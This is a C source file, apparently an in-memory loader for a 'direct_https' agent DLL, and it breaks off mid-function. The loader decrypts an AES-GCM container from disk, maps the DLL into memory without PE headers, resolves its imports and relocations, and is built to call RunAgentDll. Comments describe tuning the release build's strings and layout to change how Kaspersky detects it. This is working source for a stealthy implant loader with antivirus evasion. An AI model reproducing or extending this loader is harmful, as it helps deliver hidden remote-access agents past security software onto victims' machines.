#include <windows.h>
#include <bcrypt.h>
#include <stdlib.h>
#include <string.h>

/*
 * 文件作用：专门加载 DHPL1 direct_https 容器的 profile-only loader。
 *
 * 小白版流程：
 * 1. exe 读取 cache.dhpl；
 * 2. 用 AES-256-GCM 解密，得到 DHPL1 自定义容器；
 * 3. 容器里不是完整 PE 文件，而是已经离线拆好的 section/import/reloc/TLS 等最小信息；
 * 4. loader 按这些最小信息把 direct_https DLL 映射到内存；
 * 5. 内存 image base 位置不复制 MZ/PE/section header；
 * 6. RunAgentDll 的 RVA 已由 packer 离线写进 DHPL1，运行时不查 export table；
 * 7. 调 RunAgentDll，进入 direct_https 学习版 agent。
 *
 * 这不是通用 PE loader。它只服务于当前 packer 产出的 direct_https_profile.x64.dll。
 */

typedef DWORD (WINAPI *RunAgentDllFn)(void);
typedef BOOL (WINAPI *DllMainFn)(HINSTANCE, DWORD, LPVOID);

#ifndef PROFILE_ONLY_KEY
#define PROFILE_ONLY_KEY "CHANGE_ME_MEMORY_LOADER_KEY"
#endif

#ifndef PROFILE_ONLY_KEY_ENV
#define PROFILE_ONLY_KEY_ENV "DHPL_KEY"
#endif

#ifndef PROFILE_ONLY_KEY_FILE_ENV
#define PROFILE_ONLY_KEY_FILE_ENV "DHPL_KEY_FILE"
#endif

#define DHPL_VERSION 1
#define DHPL_ARCH_X64 0x8664
#define DHPL_MAGIC0 'D'
#define DHPL_MAGIC1 'H'
#define DHPL_MAGIC2 'P'
#define DHPL_MAGIC3 'L'
#define DHPL_MAGIC4 '1'

#define DHPLE1_VERSION 1
#define DHPLE2_VERSION 2
#define DHPLE_ALG_AES256_GCM_SHA256_KEY 1
#define DHPLE_ALG_AES256_GCM_PBKDF2_SHA256_KEY 2
#define DHPLE_KDF_PBKDF2_HMAC_SHA256 1
#define DHPLE_MAGIC0 'D'
#define DHPLE_MAGIC1 'H'
#define DHPLE_MAGIC2 'P'
#define DHPLE_MAGIC3 'L'
#define DHPLE_MAGIC4 'E'
#define DHPLE_MAGIC5_V1 '1'
#define DHPLE_MAGIC5_V2 '2'

static const unsigned char DHPLE_AAD_V1[] = "DHPL1-AES256-GCM-SHA256KEY-v1";
static const unsigned char DHPLE_AAD_V2[] = "DHPL1-AES256-GCM-PBKDF2-SHA256-v2";

#ifndef NT_SUCCESS
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#endif

/*
 * R01 单变量实验：release_plus_diag_strings。
 *
 * 背景：
 * - Kaspersky 当前会处理更“小、更安静”的 release loader；
 * - diag loader 因为携带大量 DHPL/DHPLE 状态字符串、WriteFile/wsprintfA 和日志分支，
 *   在同一环境下反而能落地、上线。
 *
 * 这个宏只给 release 变体加入一组“可见但不参与核心逻辑”的状态字符串，
 * 用来验证是否是二进制字符串/布局扰动改变了落地检测结果。
 * 它不写日志、不改变 key derive、解密、映射、import、TLS、DllMain、RunAgentDll 逻辑。
 */
#if defined(PROFILE_ONLY_RELEASE_MARKERS)
__attribute__((used))
static const char* const g_profile_release_markers[] = {
    "DHPL_START",
    "DHPL_READ_OK_SIZE",
    "DHPLE2_HEADER_FOUND",
    "DHPLE2_KEY_DERIVE_OK",
    "DHPLE2_DECRYPT_OK",
    "DHPL_VALIDATE_OK",
    "DHPL_ALLOC_OK",
    "DHPL_SECTIONS_OK",
    "DHPL_RELOC_OK",
    "DHPL_IMPORT_OK",
    "DHPL_EXCEPTION_OK",
    "DHPL_PROTECT_OK",
    "DHPL_TLS_OK",
    "DHPL_DLLMAIN_OK",
    "DHPL_HEADER_ZERO_OK",
    "DHPL_CONTAINER_ZERO_OK",
    "DHPL_RUN_AGENT_BEGIN"
};

static void touch_release_markers(void)
{
    /*
     * volatile 让编译器保留这个引用，避免 -Os 下把整组字符串优化掉。
     * 条件永远不成立，不会产生实际行为变化。
     */
    volatile const char* p = g_profile_release_markers[0];
    if (p == (const char*)1) {
        Sleep(0);
    }
}
#else
static void touch_release_markers(void)
{
}
#endif

static const char* g_log_path = NULL;

#pragma pack(push, 1)
typedef struct DHPL_HEADER {
    char magic[8];
    DWORD version;
    DWORD arch;
    DWORD header_size;
    DWORD flags;
    ULONGLONG preferred_base;
    DWORD image_size;
    DWORD size_of_headers;
    DWORD entry_point_rva;
    DWORD run_agent_rva;
    DWORD section_count;
    DWORD reloc_count;
    DWORD import_count;
    DWORD tls_count;
    DWORD exception_rva;
    DWORD exception_size;
    DWORD sections_offset;
    DWORD relocs_offset;
    DWORD imports_offset;
    DWORD tls_offset;
    DWORD data_offset;
    DWORD total_size;
    DWORD reserved0;
    DWORD reserved1;
} DHPL_HEADER;

typedef struct DHPL_SECTION {
    DWORD virtual_address;
    DWORD virtual_size;
    DWORD raw_size;
    DWORD data_offset;
    DWORD data_size;
    DWORD characteristics;
    DWORD protect;
    DWORD reserved;
} DHPL_SECTION;

typedef struct DHPL_IMPORT_FIXED {
    DWORD iat_rva;
    WORD module_len;
    WORD name_len;
} DHPL_IMPORT_FIXED;

typedef struct DHPLE1_HEADER {
    char magic[8];
    DWORD version;
    DWORD algorithm;
    DWORD nonce_len;
    DWORD tag_len;
    DWORD plain_size;
    DWORD cipher_size;
} DHPLE1_HEADER;

typedef struct DHPLE2_HEADER {
    char magic[8];
    DWORD version;
    DWORD algorithm;
    DWORD kdf;
    DWORD iterations;
    DWORD salt_len;
    DWORD nonce_len;
    DWORD tag_len;
    DWORD plain_size;
    DWORD cipher_size;
} DHPLE2_HEADER;
#pragma pack(pop)

static void diag_log(const char* text)
{
#if defined(PROFILE_ONLY_DIAG)
    HANDLE h;
    DWORD written = 0;
    if (!g_log_path || !text) return;
    h = CreateFileA(g_log_path, FILE_APPEND_DATA, FILE_SHARE_READ, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (h == INVALID_HANDLE_VALUE) return;
    WriteFile(h, text, (DWORD)strlen(text), &written, NULL);
    WriteFile(h, "\r\n", 2, &written, NULL);
    CloseHandle(h);
#else
    (void)text;
#endif
}

static void diag_log_num(const char* key, DWORD value)
{
#if defined(PROFILE_ONLY_DIAG)
    char buf[128];
    wsprintfA(buf, "%s=%lu", key ? key : "value", (unsigned long)value);
    diag_log(buf);
#else
    (void)key;
    (void)value;
#endif
}

static void diag_log_hex64(const char* key, ULONGLONG value)
{
#if defined(PROFILE_ONLY_DIAG)
    char buf[160];
    wsprintfA(buf, "%s=0x%08lx%08lx", key ? key : "value", (unsigned long)(value >> 32), (unsigned long)(value & 0xffffffffULL));
    diag_log(buf);
#else
    (void)key;
    (void)value;
#endif
}

static void* heap_alloc(SIZE_T size)
{
    return HeapAlloc(GetProcessHeap(), 0, size);
}

static void heap_free(void* ptr)
{
    if (ptr) HeapFree(GetProcessHeap(), 0, ptr);
}

static void heap_secure_free(unsigned char* ptr, DWORD size)
{
    if (ptr) {
        if (size) SecureZeroMemory(ptr, size);
        heap_free(ptr);
    }
}

static DWORD align_up_dword(DWORD value, DWORD align)
{
    return (value + align - 1) & ~(align - 1);
}

static DWORD align_down_dword(DWORD value, DWORD align)
{
    return value & ~(align - 1);
}

static int range_ok(DWORD offset, DWORD size, DWORD total)
{
    return offset <= total && size <= total - offset;
}

static int rva_range_ok(DWORD rva, DWORD size, DWORD image_size)
{
    return rva <= image_size && size <= image_size - rva;
}

static int read_file_winapi(const char* path, unsigned char** outBuf, DWORD* outSize)
{
    HANDLE h;
    LARGE_INTEGER li;
    DWORD total = 0;
    unsigned char* buf;

    if (!path || !outBuf || !outSize) return 1;
    *outBuf = NULL;
    *outSize = 0;

    h = CreateFileA(path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (h == INVALID_HANDLE_VALUE) return 2;
    if (!GetFileSizeEx(h, &li) || li.QuadPart <= 0 || li.QuadPart > 128 * 1024 * 1024) {
        CloseHandle(h);
        return 3;
    }
    buf = (unsigned char*)heap_alloc((SIZE_T)li.QuadPart);
    if (!buf) {
        CloseHandle(h);
        return 4;
    }
    while (total < (DWORD)li.QuadPart) {
        DWORD got = 0;
        DWORD want = (DWORD)li.QuadPart - total;
        if (!ReadFile(h, buf + total, want, &got, NULL) || got == 0) {
            heap_free(buf);
            CloseHandle(h);
            return 5;
        }
        total += got;
    }
    CloseHandle(h);
    *outBuf = buf;
    *outSize = total;
    return 0;
}

static int str_eq(const char* a, const char* b)
{
    if (!a || !b) return 0;
    while (*a && *b) {
        if (*a != *b) return 0;
        a++;
        b++;
    }
    return *a == 0 && *b == 0;
}

static int str_starts_with(const char* s, const char* prefix)
{
    if (!s || !prefix) return 0;
    while (*prefix) {
        if (*s != *prefix) return 0;
        s++;
        prefix++;
    }
    return 1;
}

static void trim_ascii_key(char* s)
{
    char* end;
    char* start;
    SIZE_T len;
    if (!s) return;
    start = s;
    while (*start == ' ' || *start == '\t' || *start == '\r' || *start == '\n') {
        start++;
    }
    if (start != s) {
        memmove(s, start, strlen(start) + 1);
    }
    len = strlen(s);
    if (!len) return;
    end = s + len - 1;
    while (end >= s && (*end == ' ' || *end == '\t' || *end == '\r' || *end == '\n')) {
        *end = 0;
        if (end == s) break;
        end--;
    }
}

static char* read_key_file_alloc(const char* path)
{
    unsigned char* raw = NULL;
    DWORD rawSize = 0;
    char* text = NULL;
    DWORD rc;

    if (!path || !path[0]) return NULL;
    rc = (DWORD)read_file_winapi(path, &raw, &rawSize);
    if (rc != 0 || !raw || rawSize == 0 || rawSize > 4096) {
        if (raw) heap_secure_free(raw, rawSize);
        return NULL;
    }
    text = (char*)heap_alloc((SIZE_T)rawSize + 1);
    if (!text) {
        heap_secure_free(raw, rawSize);
        return NULL;
    }
    memcpy(text, raw, rawSize);
    text[rawSize] = 0;
    heap_secure_free(raw, rawSize);
    trim_ascii_key(text);
    if (!text[0]) {
        heap_secure_free((unsigned char*)text, rawSize + 1);
        return NULL;
    }
    return text;
}

static const char* resolve_key_source(const char* keyArg, char** ownedKey)
{
    const char* value = NULL;
    const char* name = NULL;
    const char* path = NULL;

    if (ownedKey) *ownedKey = NULL;

    /*
     * key 来源优先级：
     * 1. argv[2] 明确指定：
     *    - 普通字符串：直接当 passphrase；
     *    - env 或 env:NAME：从环境变量读取；
     *    - file 或 file:PATH：从本地文本文件读取；
     * 2. 如果 argv[2] 没传，先尝试 DHPL_KEY；
     * 3. 再尝试 DHPL_KEY_FILE；
     * 4. 最后回退到编译期 PROFILE_ONLY_KEY，保证旧测试脚本不被破坏。
     */
    if (keyArg && keyArg[0]) {
        if (str_eq(keyArg, "env") || str_eq(keyArg, "env:") || str_eq(keyArg, "-")) {
            value = getenv(PROFILE_ONLY_KEY_ENV);
            return (value && value[0]) ? value : NULL;
        }
        if (str_starts_with(keyArg, "env:")) {
            name = keyArg + 4;
            value = getenv((name && name[0]) ? name : PROFILE_ONLY_KEY_ENV);
            return (value && value[0]) ? value : NULL;
        }
        if (str_eq(keyArg, "file") || str_eq(keyArg, "file:")) {
            path = getenv(PROFILE_ONLY_KEY_FILE_ENV);
            if (!path || !path[0] || !ownedKey) return NULL;
            *ownedKey = read_key_file_alloc(path);
            return *ownedKey;
        }
        if (str_starts_with(keyArg, "file:")) {
            path = keyArg + 5;
            if (!path || !path[0] || !ownedKey) return NULL;
            *ownedKey = read_key_file_alloc(path);
            return *ownedKey;
        }
        return keyArg;
    }

    value = getenv(PROFILE_ONLY_KEY_ENV);
    if (value && value[0]) return value;

    path = getenv(PROFILE_ONLY_KEY_FILE_ENV);
    if (path && path[0] && ownedKey) {
        *ownedKey = read_key_file_alloc(path);
        if (*ownedKey) return *ownedKey;
    }

    return PROFILE_ONLY_KEY;
}

static int dhple_magic_common_ok(const char magic[8], char versionChar)
{
    return magic &&
        magic[0] == DHPLE_MAGIC0 &&
        magic[1] == DHPLE_MAGIC1 &&
        magic[2] == DHPLE_MAGIC2 &&
        magic[3] == DHPLE_MAGIC3 &&
        magic[4] == DHPLE_MAGIC4 &&
        magic[5] == versionChar &&
        magic[6] == 0 &&
        magic[7] == 0;
}

static int dhple1_magic_ok(const DHPLE1_HEADER* h)
{
    return h && dhple_magic_common_ok(h->magic, DHPLE_MAGIC5_V1);
}

static int dhple2_magic_ok(const DHPLE2_HEADER* h)
{
    return h && dhple_magic_common_ok(h->magic, DHPLE_MAGIC5_V2);
}

static int derive_aes256_key_sha256(const char* passphrase, unsigned char outKey[32])
{
    BCRYPT_ALG_HANDLE hAlg = NULL;
    BCRYPT_HASH_HANDLE hHash = NULL;
    unsigned char* hashObject = NULL;
    DWORD objectLength = 0;
    DWORD hashLength = 0;
    DWORD cb = 0;
    NTSTATUS st;

    if (!passphrase || !passphrase[0] || !outKey) return 0;
    st = BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_SHA256_ALGORITHM, NULL, 0);
    if (!NT_SUCCESS(st)) goto fail;
    st = BCryptGetProperty(hAlg, BCRYPT_OBJECT_LENGTH, (PUCHAR)&objectLength, sizeof(objectLength), &cb, 0);
    if (!NT_SUCCESS(st) || !objectLength) goto fail;
    st = BCryptGetProperty(hAlg, BCRYPT_HASH_LENGTH, (PUCHAR)&hashLength, sizeof(hashLength), &cb, 0);
    if (!NT_SUCCESS(st) || hashLength != 32) goto fail;
    hashObject = (unsigned char*)heap_alloc(objectLength);
    if (!hashObject) goto fail;
    st = BCryptCreateHash(hAlg, &hHash, hashObject, objectLength, NULL, 0, 0);
    if (!NT_SUCCESS(st)) goto fail;
    st = BCryptHashData(hHash, (PUCHAR)passphrase, (ULONG)strlen(passphrase), 0);
    if (!NT_SUCCESS(st)) goto fail;
    st = BCryptFinishHash(hHash, outKey, 32, 0);
    if (!NT_SUCCESS(st)) goto fail;

    BCryptDestroyHash(hHash);
    SecureZeroMemory(hashObject, objectLength);
    heap_free(hashObject);
    BCryptCloseAlgorithmProvider(hAlg, 0);
    return 1;

fail:
    if (hHash) BCryptDestroyHash(hHash);
    if (hashObject) {
        SecureZeroMemory(hashObject, objectLength);
        heap_free(hashObject);
    }
    if (hAlg) BCryptCloseAlgorithmProvider(hAlg, 0);
    return 0;
}

static int derive_aes256_key_pbkdf2_sha256(const char* passphrase, const unsigned char* salt, DWORD saltLen, ULONGLONG iterations, unsigned char outKey[32])
{
    BCRYPT_ALG_HANDLE hPrf = NULL;
    NTSTATUS st;

    if (!passphrase || !passphrase[0] || !salt || !saltLen || !iterations || !outKey) return 0;
    /*
     * DHPLE2 使用 PBKDF2-HMAC-SHA256：
     * - passphrase 仍由命令行传入；
     * - salt 存在 DHPLE2 header 后面，每个容器随机生成；
     * - iterations 也写在容器里，Windows 侧按同样参数复现 key。
     */
    st = BCryptOpenAlgorithmProvider(&hPrf, BCRYPT_SHA256_ALGORITHM, NULL, BCRYPT_ALG_HANDLE_HMAC_FLAG);
    if (!NT_SUCCESS(st)) goto fail;
    st = BCryptDeriveKeyPBKDF2(
        hPrf,
        (PUCHAR)passphrase,
        (ULONG)strlen(passphrase),
        (PUCHAR)salt,
        saltLen,
        iterations,
        outKey,
        32,
        0
    );
    if (!NT_SUCCESS(st)) goto fail;
    BCryptCloseAlgorithmProvider(hPrf, 0);
    return 1;

fail:
    if (hPrf) BCryptCloseAlgorithmProvider(hPrf, 0);
    return 0;
}

static int decrypt_cipher_aes_gcm_with_key(
    const unsigned char* nonce,
    DWORD nonceLen,
    const unsigned char* tag,
    DWORD tagLen,
    const unsigned char* cipher,
    DWORD cipherSize,
    DWORD plainSize,
    const unsigned char* aad,
    DWORD aadLen,
    const unsigned char key[32],
    unsigned char** outPlain,
    DWORD* outPlainSize)
{
    unsigned char* plain = NULL;
    unsigned char* keyObject = NULL;
    DWORD keyObjectLength = 0;
    DWORD cb = 0;
    DWORD resultSize = 0;
    BCRYPT_ALG_HANDLE hAlg = NULL;
    BCRYPT_KEY_HANDLE hKey = NULL;
    BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO authInfo;
    NTSTATUS st;

    if (!nonce || !nonceLen || !tag || !tagLen || !cipher || !cipherSize || !plainSize || !aad || !aadLen || !key || !outPlain || !outPlainSize) return 0;
    *outPlain = NULL;
    *outPlainSize = 0;

    st = BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0);
    if (!NT_SUCCESS(st)) goto fail;
    st = BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, (PUCHAR)BCRYPT_CHAIN_MODE_GCM, sizeof(BCRYPT_CHAIN_MODE_GCM), 0);
    if (!NT_SUCCESS(st)) goto fail;
    st = BCryptGetProperty(hAlg, BCRYPT_OBJECT_LENGTH, (PUCHAR)&keyObjectLength, sizeof(keyObjectLength), &cb, 0);
    if (!NT_SUCCESS(st) || !keyObjectLength) goto fail;
    keyObject = (unsigned char*)heap_alloc(keyObjectLength);
    if (!keyObject) goto fail;
    st = BCryptGenerateSymmetricKey(hAlg, &hKey, keyObject, keyObjectLength, (PUCHAR)key, 32, 0);
    if (!NT_SUCCESS(st)) goto fail;

    plain = (unsigned char*)heap_alloc(plainSize);
    if (!plain) goto fail;
    BCRYPT_INIT_AUTH_MODE_INFO(authInfo);
    authInfo.pbNonce = (PUCHAR)nonce;
    authInfo.cbNonce = nonceLen;
    authInfo.pbTag = (PUCHAR)tag;
    authInfo.cbTag = tagLen;
    authInfo.pbAuthData = (PUCHAR)aad;
    authInfo.cbAuthData = aadLen;

    st = BCryptDecrypt(hKey, (PUCHAR)cipher, cipherSize, &authInfo, NULL, 0, plain, plainSize, &resultSize, 0);
    if (!NT_SUCCESS(st) || resultSize != plainSize) goto fail;

    if (hKey) BCryptDestroyKey(hKey);
    if (keyObject) {
        SecureZeroMemory(keyObject, keyObjectLength);
        heap_free(keyObject);
    }
    if (hAlg) BCryptCloseAlgorithmProvider(hAlg, 0);
    *outPlain = plain;
    *outPlainSize = plainSize;
    return 1;

fail:
    if (plain) {
        SecureZeroMemory(plain, plainSize);
        heap_free(plain);
    }
    if (hKey) BCryptDestroyKey(hKey);
    if (keyObject) {
        SecureZeroMemory(keyObject, keyObjectLength);
        heap_free(keyObject);
    }
    if (hAlg) BCryptCloseAlgorithmProvider(hAlg, 0);
    return 0;
}

static int decrypt_envelope_aes_gcm(const unsigned char* fileData, DWORD fileSize, const char* passphrase, unsigned char** outPlain, DWORD* outPlainSize)
{
    unsigned char key[32];
    const unsigned char* salt = NULL;
    const unsigned char* nonce = NULL;
    const unsigned char* tag = NULL;
    const unsigned char* cipher = NULL;
    DWORD offset = 0;
    DWORD plainSize = 0;
    DWORD cipherSize = 0;
    DWORD nonceLen = 0;
    DWORD tagLen = 0;
    int ok = 0;

    if (!fileData || !outPlain || !outPlainSize) return 0;
    *outPlain = NULL;
    *outPlainSize = 0;
    SecureZeroMemory(key, sizeof(key));

    if (fileSize >= sizeof(DHPLE2_HEADER) && dhple2_magic_ok((const DHPLE2_HEADER*)fileData)) {
        const DHPLE2_HEADER* eh2 = (const DHPLE2_HEADER*)fileData;
        diag_log("DHPLE2_HEADER_FOUND");
        if (eh2->version != DHPLE2_VERSION ||
            eh2->algorithm != DHPLE_ALG_AES256_GCM_PBKDF2_SHA256_KEY ||
            eh2->kdf != DHPLE_KDF_PBKDF2_HMAC_SHA256 ||
            eh2->iterations == 0 || eh2->iterations > 10000000 ||
            eh2->salt_len == 0 || eh2->salt_len > 64 ||
            eh2->nonce_len != 12 || eh2->tag_len != 16 ||
            eh2->plain_size == 0 || eh2->cipher_size == 0) {
            diag_log("DHPLE2_HEADER_ERROR");
            return 0;
        }
        offset = (DWORD)sizeof(DHPLE2_HEADER);
        if (!range_ok(offset, eh2->salt_len, fileSize)) return 0;
        salt = fileData + offset;
        offset += eh2->salt_len;
        if (!range_ok(offset, eh2->nonce_len, fileSize)) return 0;
        nonce = fileData + offset;
        offset += eh2->nonce_len;
        if (!range_ok(offset, eh2->tag_len, fileSize)) return 0;
        tag = fileData + offset;
        offset += eh2->tag_len;
        if (!range_ok(offset, eh2->cipher_size, fileSize)) return 0;
        if (offset + eh2->cipher_size != fileSize) {
            diag_log("DHPLE2_SIZE_MISMATCH");
            return 0;
        }
        cipher = fileData + offset;
        plainSize = eh2->plain_size;
        cipherSize = eh2->cipher_size;
        nonceLen = eh2->nonce_len;
        tagLen = eh2->tag_len;

        if (!derive_aes256_key_pbkdf2_sha256(passphrase, salt, eh2->salt_len, (ULONGLONG)eh2->iterations, key)) {
            diag_log("DHPLE2_KEY_DERIVE_ERROR");
            SecureZeroMemory(key, sizeof(key));
            return 0;
        }
        diag_log("DHPLE2_KEY_DERIVE_OK");
        ok = decrypt_cipher_aes_gcm_with_key(nonce, nonceLen, tag, tagLen, cipher, cipherSize, plainSize,
                                             DHPLE_AAD_V2, (DWORD)(sizeof(DHPLE_AAD_V2) - 1), key, outPlain, outPlainSize);
        SecureZeroMemory(key, sizeof(key));
        if (!ok) {
            diag_log("DHPLE2_DECRYPT_ERROR");
            return 0;
        }
        diag_log("DHPLE2_DECRYPT_OK");
        return 1;
    }

    if (fileSize >= sizeof(DHPLE1_HEADER) && dhple1_magic_ok((const DHPLE1_HEADER*)fileData)) {
        const DHPLE1_HEADER* eh1 = (const DHPLE1_HEADER*)fileData;
        diag_log("DHPLE1_HEADER_FOUND");
        if (eh1->version != DHPLE1_VERSION || eh1->algorithm != DHPLE_ALG_AES256_GCM_SHA256_KEY ||
            eh1->nonce_len != 12 || eh1->tag_len != 16 || eh1->plain_size == 0 || eh1->cipher_size == 0) {
            diag_log("DHPLE1_HEADER_ERROR");
            return 0;
        }
        offset = (DWORD)sizeof(DHPLE1_HEADER);
        if (!range_ok(offset, eh1->nonce_len, fileSize)) return 0;
        nonce = fileData + offset;
        offset += eh1->nonce_len;
        if (!range_ok(offset, eh1->tag_len, fileSize)) return 0;
        tag = fileData + offset;
        offset += eh1->tag_len;
        if (!range_ok(offset, eh1->cipher_size, fileSize)) return 0;
        if (offset + eh1->cipher_size != fileSize) {
            diag_log("DHPLE1_SIZE_MISMATCH");
            return 0;
        }
        cipher = fileData + offset;
        plainSize = eh1->plain_size;
        cipherSize = eh1->cipher_size;
        nonceLen = eh1->nonce_len;
        tagLen = eh1->tag_len;

        if (!derive_aes256_key_sha256(passphrase, key)) {
            diag_log("DHPLE1_KEY_DERIVE_ERROR");
            SecureZeroMemory(key, sizeof(key));
            return 0;
        }
        ok = decrypt_cipher_aes_gcm_with_key(nonce, nonceLen, tag, tagLen, cipher, cipherSize, plainSize,
                                             DHPLE_AAD_V1, (DWORD)(sizeof(DHPLE_AAD_V1) - 1), key, outPlain, outPlainSize);
        SecureZeroMemory(key, sizeof(key));
        if (!ok) {
            diag_log("DHPLE1_DECRYPT_ERROR");
            return 0;
        }
        diag_log("DHPLE1_DECRYPT_OK");
        return 1;
    }

    diag_log("DHPLE_MAGIC_ERROR");
    return 0;
}

static int dhpl_magic_ok(const DHPL_HEADER* h)
{
    return h &&
        h->magic[0] == DHPL_MAGIC0 &&
        h->magic[1] == DHPL_MAGIC1 &&
        h->magic[2] == DHPL_MAGIC2 &&
        h->magic[3] == DHPL_MAGIC3 &&
        h->magic[4] == DHPL_MAGIC4 &&
        h->magic[5] == 0 &&
        h->magic[6] == 0 &&
        h->magic[7] == 0;
}

static int validate_header(const unsigned char* buf, DWORD size, const DHPL_HEADER** outHeader)
{
    const DHPL_HEADER* h;
    DWORD sections_bytes;
    DWORD relocs_bytes;
    DWORD tls_bytes;
    if (!buf || size < sizeof(DHPL_HEADER) || !outHeader) return 0;
    h = (const DHPL_HEADER*)buf;
    if (!dhpl_magic_ok(h)) {
        diag_log("DHPL_VALIDATE_MAGIC_ERROR");
        return 0;
    }
    if (h->version != DHPL_VERSION || h->arch != DHPL_ARCH_X64 || h->header_size != sizeof(DHPL_HEADER)) {
        diag_log("DHPL_VALIDATE_VERSION_OR_ARCH_ERROR");
        return 0;
    }
    if (h->total_size > size || h->total_size < sizeof(DHPL_HEADER) || h->image_size < 0x1000) {
        diag_log("DHPL_VALIDATE_SIZE_ERROR");
        return 0;
    }
    sections_bytes = h->section_count * (DWORD)sizeof(DHPL_SECTION);
    relocs_bytes = h->reloc_count * 4;
    tls_bytes = h->tls_count * 4;
    if (!range_ok(h->sections_offset, sections_bytes, h->total_size)) {
        diag_log("DHPL_VALIDATE_SECTION_RANGE_ERROR");
        return 0;
    }
    if (!range_ok(h->relocs_offset, relocs_bytes, h->total_size)) {
        diag_log("DHPL_VALIDATE_RELOC_RANGE_ERROR");
        return 0;
    }
    if (!range_ok(h->tls_offset, tls_bytes, h->total_size)) {
        diag_log("DHPL_VALIDATE_TLS_RANGE_ERROR");
        return 0;
    }
    if (!range_ok(h->imports_offset, 0, h->total_size) || !range_ok(h->data_offset, 0, h->total_size)) {
        diag_log("DHPL_VALIDATE_OFFSET_ERROR");
        return 0;
    }
    if (!rva_range_ok(h->entry_point_rva, 1, h->image_size) || !rva_range_ok(h->run_agent_rva, 1, h->image_size)) {
        diag_log("DHPL_VALIDATE_ENTRY_RANGE_ERROR");
        return 0;
    }
    *outHeader = h;
    return 1;
}

static int copy_sections(const unsigned char* container, const DHPL_HEADER* h, unsigned char* image)
{
    DWORD i;
    const DHPL_SECTION* secs = (const DHPL_SECTION*)(container + h->sections_offset);
    for (i = 0; i < h->section_count; i++) {
        const DHPL_SECTION* s = &secs[i];
        if (!rva_range_ok(s->virtual_address, s->virtual_size, h->image_size)) {
            diag_log_num("DHPL_SECTION_RANGE_ERROR_INDEX", i);
            return 0;
        }
        if (s->data_size) {
            if (!range_ok(s->data_offset, s->data_size, h->total_size)) {
                diag_log_num("DHPL_SECTION_DATA_RANGE_ERROR_INDEX", i);
                return 0;
            }
            if (s->data_size > s->virtual_size) {
                diag_log_num("DHPL_SECTION_DATA_TOO_LARGE_INDEX", i);
                return 0;
            }
            memcpy(image + s->virtual_address, container + s->data_offset, s->data_size);
        }
    }
    return 1;
}

static int apply_relocations(const unsigned char* container, const DHPL_HEADER* h, unsigned char* image, ULONGLONG actual_base)
{
    DWORD i;
    LONGLONG delta = (LONGLONG)(actual_base - h->preferred_base);
    const DWORD* relocs = (const DWORD*)(container + h->relocs_offset);
    if (delta == 0) return 1;
    for (i = 0; i < h->reloc_count; i++) {
        DWORD rva = relocs[i];
        ULONGLONG* patch;
        if (!rva_range_ok(rva, sizeof(ULONGLONG), h->image_size)) {
            diag_log_num("DHPL_RELOC_RANGE_ERROR_INDEX", i);
            return 0;
        }
        patch = (ULONGLONG*)(void*)(image + rva);
        *patch = (ULONGLONG)((LONGLONG)(*patch) + delta);
    }
    return 1;
}

static int resolve_imports(const unsigned char* container, const DHPL_HEADER* h, unsigned char* image)
{
    DWORD i;
    DWORD pos = h->imports_offset;
    for (i = 0; i < h->import_count; i++) {
        const DHPL_IMPORT_FIXED* rec;
        char* moduleName;
        char* funcName;
        HMODULE mod;
        FARPROC fn;
        DWORD next;

        if (!range_ok(pos, sizeof(DHPL_IMPORT_FIXED), h->total_size)) {
            diag_log_num("DHPL_IMPORT_FIXED_RANGE_ERROR_INDEX", i);
            return 0;
        }
        rec = (const DHPL_IMPORT_FIXED*)(container + pos);
        pos += (DWORD)sizeof(DHPL_IMPORT_FIXED);
        if (!range_ok(pos, rec->module_len + rec->name_len, h->total_size)) {
            diag_log_num("DHPL_IMPORT_STRING_RANGE_ERROR_INDEX", i);
            return 0;
        }
        if (!rva_range_ok(rec->iat_rva, sizeof(ULONGLONG), h->image_size)) {
            diag_log_num("DHPL_IMPORT_IAT_RANGE_ERROR_INDEX", i);
            return 0;
        }
        moduleName = (char*)heap_alloc(rec->module_len + 1);
        funcName = (char*)heap_alloc(rec->name_len + 1);
        if (!moduleName || !funcName) {
            heap_free(moduleName);
            heap_free(funcName);
            diag_log("DHPL_IMPORT_ALLOC_ERROR");
            return 0;
        }
        memcpy(moduleName, container + pos, rec->module_len);
        moduleName[rec->module_len] = 0;
        pos += rec->module_len;
        memcpy(funcName, container + pos, rec->name_len);
        funcName[rec->name_len] = 0;
        pos += rec->name_len;
        next = align_up_dword(pos, 4);
        if (!range_ok(pos, next - pos, h->total_size)) {
            heap_free(moduleName);
            heap_free(funcName);
            diag_log_num("DHPL_IMPORT_ALIGN_RANGE_ERROR_INDEX", i);
            return 0;
        }
        pos = next;

        mod = LoadLibraryA(moduleName);
        if (!mod) {
            diag_log("DHPL_IMPORT_LOADLIBRARY_ERROR");
            diag_log(moduleName);
            heap_free(moduleName);
            heap_free(funcName);
            return 0;
        }
        fn = GetProcAddress(mod, funcName);
        if (!fn) {
            diag_log("DHPL_IMPORT_GETPROC_ERROR");
            diag_log(moduleName);
            diag_log(funcName);
            heap_free(moduleName);
            heap_free(funcName);
            return 0;
        }
        *(ULONGLONG*)(void*)(image + rec->iat_rva) = (ULONGLONG)(ULONG_PTR)fn;
        heap_free(moduleName);
        heap_free(funcName);
    }
    return 1;
}

static int register_exception_table(const DHPL_HEADER* h, unsigned char* image)
{
#if defined(_WIN64)
    DWORD count;
    if (!h->exception_rva || !h->exception_size) {
        diag_log("DHPL_EXCEPTION_NONE");
        return 1;
    }
    if (!rva_range_ok(h->exception_rva, h->exception_size, h->image_size)) {
        diag_log("DHPL_EXCEPTION_RANGE_ERROR");
        return 0;
    }
    count = h->exception_size / sizeof(RUNTIME_FUNCTION);
    if (!count) {
        diag_log("DHPL_EXCEPTION_EMPTY");
        return 1;
    }
    if (!RtlAddFunctionTable((PRUNTIME_FUNCTION)(void*)(image + h->exception_rva), count, (DWORD64)(ULONG_PTR)image)) {
        diag_log("DHPL_EXCEPTION_RTL_ADD_ERROR");
        return 0;
    }
    diag_log_num("DHPL_EXCEPTION_COUNT", count);
    return 1;
#else
    (void)h;
    (void)image;
    return 1;
#endif
}

static int protect_sections(const unsigned char* container, const DHPL_HEADER* h, unsigned char* image)
{
